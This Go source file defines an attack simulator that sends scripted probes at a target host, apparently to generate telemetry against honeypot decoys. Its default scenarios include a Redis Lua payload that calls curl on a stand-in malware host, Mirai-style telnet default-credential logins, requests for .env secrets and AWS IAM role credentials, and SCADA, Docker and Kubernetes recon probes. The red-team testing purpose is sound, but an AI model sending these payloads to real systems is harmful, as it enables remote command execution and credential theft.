package adversary

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"
)

// AttackScenario defines an automated adversarial probe against a target port
type AttackScenario struct {
	Name        string
	Protocol    string
	Port        int
	Payload     []byte
	ExpectMatch string
}

// AttackSimulator generates synthetic adversarial telemetry against active decoys
type AttackSimulator struct {
	TargetHost string
	Timeout    time.Duration
}

// NewSimulator creates an attack generator
func NewSimulator(host string, timeout time.Duration) *AttackSimulator {
	if host == "" {
		host = "127.0.0.1"
	}
	if timeout == 0 {
		timeout = 2 * time.Second
	}
	return &AttackSimulator{
		TargetHost: host,
		Timeout:    timeout,
	}
}

// DefaultScenarios provides red team simulation payloads
func DefaultScenarios() []AttackScenario {
	return []AttackScenario{
		{
			Name:        "Redis EVAL Lua Exploit",
			Protocol:    "tcp",
			Port:        6379,
			Payload:     []byte("*3\r\n$4\r\nEVAL\r\n$33\r\nos.execute('curl http://malware')\r\n$1\r\n0\r\n"),
			ExpectMatch: "nil",
		},
		{
			Name:        "Telnet Mirai Botnet Recon",
			Protocol:    "tcp",
			Port:        2323,
			Payload:     []byte("admin\n123456\n/bin/busybox MIRAI\nexit\n"),
			ExpectMatch: "BusyBox",
		},
		{
			Name:        "MQTT IoT Exploit Publish",
			Protocol:    "tcp",
			Port:        1883,
			Payload:     []byte{0x30, 0x0b, 0x00, 0x04, 't', 'e', 's', 't', 'p', 'w', 'n'},
			ExpectMatch: "",
		},
		{
			Name:        "SMBv2 Protocol Negotiation",
			Protocol:    "tcp",
			Port:        4445,
			Payload:     []byte{0x00, 0x00, 0x00, 0x08, 0xfe, 'S', 'M', 'B', 0x00, 0x00, 0x00, 0x00},
			ExpectMatch: "",
		},
		{
			Name:        "HTTP Actuator / Env Leak Probe",
			Protocol:    "http",
			Port:        8080,
			Payload:     []byte("GET /.env HTTP/1.1\r\nHost: target\r\n\r\n"),
			ExpectMatch: "AWS_SECRET_ACCESS_KEY",
		},
		{
			Name:        "AWS IMDS SSRF IAM Role Exfiltration",
			Protocol:    "http",
			Port:        8169,
			Payload:     []byte("GET /latest/meta-data/iam/security-credentials/admin-role HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n"),
			ExpectMatch: "AccessKeyId",
		},
		{
			Name:        "Modbus/TCP SCADA Holding Registers Probe",
			Protocol:    "tcp",
			Port:        502,
			Payload:     []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x02},
			ExpectMatch: "",
		},
		{
			Name:        "PostgreSQL 3.0 Startup Handshake",
			Protocol:    "tcp",
			Port:        5432,
			Payload:     []byte{0x00, 0x00, 0x00, 0x08, 0x04, 0xd2, 0x16, 0x2f}, // SSLRequest
			ExpectMatch: "N",
		},
		{
			Name:        "Docker Engine Daemon Recon",
			Protocol:    "http",
			Port:        2375,
			Payload:     []byte("GET /version HTTP/1.1\r\nHost: target\r\n\r\n"),
			ExpectMatch: "Docker",
		},
		{
			Name:        "Kubernetes Control Plane API Discovery",
			Protocol:    "http",
			Port:        6443,
			Payload:     []byte("GET /version HTTP/1.1\r\nHost: target\r\n\r\n"),
			ExpectMatch: "kubernetes",
		},
	}
}

// RunScenario executes a single adversarial scenario
func (s *AttackSimulator) RunScenario(ctx context.Context, scenario AttackScenario) (string, error) {
	addr := fmt.Sprintf("%s:%d", s.TargetHost, scenario.Port)

	switch scenario.Protocol {
	case "tcp":
		d := net.Dialer{Timeout: s.Timeout}
		conn, err := d.DialContext(ctx, "tcp", addr)
		if err != nil {
			return "", err
		}
		defer conn.Close()

		_ = conn.SetDeadline(time.Now().Add(s.Timeout))
		if len(scenario.Payload) > 0 {
			if _, err := conn.Write(scenario.Payload); err != nil {
				return "", err
			}
		}

		buf := make([]byte, 2048)
		n, err := conn.Read(buf)
		if err != nil && err != io.EOF {
			return "", err
		}
		res := string(buf[:n])
		if scenario.ExpectMatch != "" && !strings.Contains(res, scenario.ExpectMatch) {
			return res, fmt.Errorf("expected match %q not found in response", scenario.ExpectMatch)
		}
		return res, nil

	case "http":
		client := &http.Client{
			Timeout: s.Timeout,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}

		reqURL := fmt.Sprintf("http://%s", addr)
		if strings.HasPrefix(string(scenario.Payload), "GET ") {
			parts := strings.Split(string(scenario.Payload), " ")
			if len(parts) > 1 {
				reqURL = fmt.Sprintf("http://%s%s", addr, parts[1])
			}
		}

		req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
		if err != nil {
			return "", err
		}

		resp, err := client.Do(req)
		if err != nil {
			return "", err
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}
		res := string(body)
		if scenario.ExpectMatch != "" && !strings.Contains(res, scenario.ExpectMatch) {
			return res, fmt.Errorf("expected match %q not found in response", scenario.ExpectMatch)
		}
		return res, nil

	default:
		return "", fmt.Errorf("unsupported protocol %q", scenario.Protocol)
	}
}
